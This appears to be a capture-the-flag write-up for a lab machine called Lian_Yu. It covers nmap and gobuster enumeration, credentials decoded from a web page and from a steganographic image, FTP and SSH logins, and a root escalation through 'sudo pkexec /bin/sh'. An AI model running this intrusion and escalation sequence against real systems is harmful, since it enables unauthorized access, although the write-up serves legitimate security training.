Target: 10.10.206.38

## Enumeration:

nmap
```bash
$ nmap -sC -sV 10.10.206.38
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-17 01:56 PDT
Nmap scan report for 10.10.206.38
Host is up (0.21s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38459/udp   status
|   100024  1          40094/udp6  status
|   100024  1          50089/tcp   status
|_  100024  1          58960/tcp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

gobuster
```bash
$ gobuster dir -u http://10.10.206.38 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -z

/island               (Status: 301) [Size: 235] [--> http://10.10.206.38/island/]
```

visiting http://10.10.206.38/island/
```html
<snip>
<h1> Ohhh Noo, Don't Talk............... </h1>

<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->

<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
<snip>
```

gobuster
```bash
$ gobuster dir -u http://10.10.206.38/island -w nolist.txt   

/2100                 (Status: 301) [Size: 240] [--> http://10.10.206.38/island/2100/]
```

visiting http://10.10.206.38/island/2100/
```html
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```

gobuster
```bash
$ dir -u http://10.10.206.38/island/2100 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x .ticket -z

/green_arrow.ticket   (Status: 200) [Size: 71]
```

visiting http://10.10.206.38/island/2100/
```html

This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```

Decoding 

RTy8yhBQdscX -> from base58 -> !#th3h00d

Loot:

vigilante:!#th3h00d


## Foothold:

ftp
```bash
$ ftp 10.10.206.38
```

```
ls ..
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01  2020 slade
drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
```

get Queen's_Gambit.png
```
xxd Queen\'s_Gambit.png| head
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0500 0000 02d0 0806 0000 00cf 7ddd  ..............}.
00000020: 5600 0000 0173 5247 4200 aece 1ce9 0000  V....sRGB.......
00000030: 0159 6954 5874 584d 4c3a 636f 6d2e 6164  .YiTXtXML:com.ad
00000040: 6f62 652e 786d 7000 0000 0000 3c78 3a78  obe.xmp.....<x:x
00000050: 6d70 6d65 7461 2078 6d6c 6e73 3a78 3d22  mpmeta xmlns:x="
00000060: 6164 6f62 653a 6e73 3a6d 6574 612f 2220  adobe:ns:meta/" 
00000070: 783a 786d 7074 6b3d 2258 4d50 2043 6f72  x:xmptk="XMP Cor
00000080: 6520 352e 342e 3022 3e0a 2020 203c 7264  e 5.4.0">.   <rd
00000090: 663a 5244 4620 786d 6c6e 733a 7264 663d  f:RDF xmlns:rdf=

```

get Leave_me_alone.png 
```
$ xxd Leave_me_alone.png | head                                     
00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR
00000010: 0000 034d 0000 01db 0806 0000 0017 a371  ...M...........q
00000020: 5b00 0020 0049 4441 5478 9cac bde9 7a24  [.. .IDATx....z$
00000030: 4b6e 2508 33f7 e092 6466 dea5 557b 6934  Kn%.3...df..U{i4
00000040: 6a69 54fd f573 cebc c03c 9c7e b4d4 a556  jiT..s...<.~...V
00000050: 4955 75d7 5c98 5c22 c2dd 6c3e 00e7 c0e0  IUu.\.\"..l>....
00000060: 4e66 a94a 3d71 3f5e 32c9 085f cccd 60c0  Nf.J=q?^2.._..`.
00000070: c1c1 41f9 7ffe dfff bb2f eb22 fab5 aeab  ..A....../."....
00000080: 7d9d cfe7 f81e 5fcb 49ce ed94 7eb7 d8d7  }....._.I...~...
00000090: 723c c9e9 7492 d3d3 494e c793 9c8f 8b2c  r<..t...IN.....,

```

fixing magic-bytes
```
$ hexedit Leave_me_alone.png

00000000   89 50 4E 47  0D 0A 1A 0A  00 00 00 0D  49 48 44 52  .PNG........IHDR
<snip>
```

viewing png 

findings: password

get aa.jpg
```
$ steghide extract -sf aa.jpg
Enter passphrase: 
wrote extracted data to "ss.zip".
```

```
$ unzip ss.zip
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado    
```

```
$ cat passwd.txt           
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.

$ cat shado
M3tahuman
```

Loot:

slade:M3tahuman


## Lateral Movement:

## Priv Escalation:

Login
```bash
$ ssh slade@10.10.206.38
```

```bash
$ cat user.txt
<redacted>
```

```bash
$ sudo -l
<snip>
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

```bash
$ sudo pkexec /bin/sh
```

```bash
$ cat /root/root.txt
<redacted>
```
